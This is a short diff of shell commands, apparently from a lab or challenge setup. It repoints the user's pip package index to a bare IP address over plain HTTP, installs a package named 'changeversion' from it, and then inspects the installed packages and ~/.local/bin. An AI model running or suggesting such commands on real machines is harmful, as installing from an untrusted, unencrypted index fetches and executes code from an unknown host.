@@ -1,4 +1,4 @@
-pip config --user set global.index-url http://18.170.223.248:8080/simple/
+pip config --user set global.index-url http://18.170.223.248:8080/
 pip install changeversion
 pip list
 ls -la ~/.local/bin/
